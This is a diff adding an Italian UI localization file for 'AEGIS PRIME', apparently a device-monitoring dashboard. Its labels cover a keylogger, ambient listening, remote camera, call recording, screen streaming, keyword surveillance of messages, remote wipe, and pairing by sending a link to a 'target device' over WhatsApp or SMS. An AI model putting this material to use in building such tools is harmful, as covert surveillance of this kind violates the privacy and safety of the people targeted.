@@ -1,0 +1,133 @@
+{
+  "app": {
+    "title": "AEGIS PRIME",
+    "subtitle": "Cruscotto War Room v3.0",
+    "status": "SISTEMA: ONLINE",
+    "encrypted": "CRITTOGRAFATO: AES-256",
+    "threat_level": "LIVELLO MINACCIA: BASSO",
+    "operator": "OPERATORE",
+    "operator_id": "ID: 88-ALPHA",
+    "no_alerts": "Nessun nuovo avviso"
+  },
+  "sidebar": {
+    "my_subscriptions": "I MIEI ABBONAMENTI",
+    "dashboard": "Cruscotto",
+    "remote_control": "CONTROLLO REMOTO",
+    "surroundings_listening": "Ascolto Ambientale",
+    "remote_camera": "Fotocamera Remota",
+    "call_recorder": "Registratore Chiamate",
+    "live_screenshots": "Screenshot in Diretta",
+    "live_screen_streaming": "Streaming Schermo in Diretta",
+    "block_apps": "Blocca App",
+    "block_websites": "Blocca Siti Web",
+    "block_wifi": "Blocca Wi-Fi",
+    "ai_tools": "STRUMENTI IA",
+    "chatgpt": "ChatGPT",
+    "gemini": "Gemini",
+    "monitoring": "MONITORAGGIO",
+    "keywords": "Parole Chiave",
+    "spy_panel": "Sorveglianza Profonda"
+  },
+  "spy": {
+    "title": "SORVEGLIANZA PROFONDA",
+    "subtitle": "Accesso ai dati grezzi e file nascosti",
+    "tabs": {
+      "keylogger": "KEYLOGGER",
+      "media": "FILE & MEDIA",
+      "schedule": "PIANIFICAZIONI"
+    },
+    "keylogger_status": "Stato Keylogger",
+    "active": "ATTIVO (Accessibilità Concessa)",
+    "clear_logs": "CANCELLA REGISTRI",
+    "new_rule": "NUOVA REGOLA DI AUTO-REGISTRAZIONE",
+    "type": "Tipo di Acquisizione",
+    "interval": "Intervallo",
+    "duration": "Durata (se audio)",
+    "activate_schedule": "ATTIVA PIANIFICAZIONE",
+    "active_rules": "Regole Attive"
+  },
+  "keywords": {
+    "title": "SENTINELLA PAROLE CHIAVE",
+    "subtitle": "Monitoraggio semantico di messaggi e digitazione in tempo reale",
+    "active_monitoring": "MONITORAGGIO ATTIVO",
+    "add_trigger": "Aggiungi Nuovo Attivatore",
+    "keyword_label": "Parola Chiave / Frase",
+    "placeholder": "Es: aiutami, riunione segreta...",
+    "category": "Categoria",
+    "severity": "Gravità",
+    "activate_trigger": "ATTIVA ATTIVATORE",
+    "latest_detections": "Ultime Rilevazioni (Simulazione)",
+    "active_triggers": "Attivatori Attivi",
+    "synced": "SINCRONIZZATO CON AGENTE"
+  },
+  "command": {
+    "title": "Risorse Protette",
+    "no_assets": "NESSUNA RISORSA CONNESSA",
+    "waiting": "In attesa di telemetria agente...",
+    "ai_matrix": "Matrice Minacce IA",
+    "matrix": {
+      "sentiment": "Analisi del Sentimento",
+      "geo": "Rischio Geospaziale",
+      "chatgpt": "Integrazione ChatGPT"
+    },
+    "actions": {
+      "mic": "Mic",
+      "cam": "Cam",
+      "rec": "Reg",
+      "shot": "Scat",
+      "live": "Live",
+      "lock": "Bloc",
+      "wipe": "Canc"
+    }
+  },
+  "map": {
+    "target_locked": "BERSAGLIO AGGANCIATO",
+    "device": "DISPOSITIVO",
+    "battery": "BATTERIA",
+    "status": "STATO",
+    "online": "ONLINE",
+    "offline": "OFFLINE",
+    "coords": "COORD",
+    "overlay": "SOVRAPPOSIZIONE TATTICA",
+    "friendly": "UNITÀ ALLEATE",
+    "hostiles": "OSTILI"
+  },
+  "feed": {
+    "title": "FEED ATTIVITÀ IN TEMPO REALE",
+    "live": "LIVE"
+  },
+  "intel": {
+    "telemetry": "Telemetria Dispositivo",
+    "network": "Rete",
+    "persistence": "Persistenza",
+    "critical_alerts": "Avvisi Critici",
+    "top_websites": "Siti Più Visitati (24h)",
+    "top_contacts": "Contatti Principali",
+    "calls": "chiamate",
+    "acknowledge": "Riconosci",
+    "locate": "Localizza"
+  },
+  "settings": {
+    "title": "Configurazione Sistema",
+    "language": "Lingua Interfaccia",
+    "select_language": "Seleziona Lingua",
+    "close": "Chiudi",
+    "save": "Salva Modifiche"
+  },
+  "pairing": {
+    "title": "AGGIUNGI NUOVO DISPOSITIVO",
+    "scan_title": "Scansiona con Fotocamera (HTTPS v2)",
+    "scan_subtitle": "Apri la fotocamera o un lettore QR. Rileverà un link sicuro HTTPS.",
+    "scan_with_app": "Scansiona con App Aegis",
+    "scan_instruction": "Apri l'app sul dispositivo target e punta la fotocamera su questo codice.",
+    "deep_link_label": "DEEP LINK",
+    "deep_link_instruction": "Invia questo link al dispositivo target via WhatsApp, SMS o Email. Cliccandolo si accoppierà automaticamente.",
+    "manual_code_label": "CODICE MANUALE",
+    "manual_code_instruction": "Inserisci manualmente questo codice a 6 cifre nella schermata di accoppiamento dell'App Aegis.",
+    "nfc_title": "Pronto per NFC",
+    "nfc_instruction": "Avvicina il dispositivo target a questo terminale (se supportato).",
+    "expires_in": "SESSIONE SCADE TRA:",
+    "id": "ID",
+    "copy_text": "Copia Testo"
+  }
+}
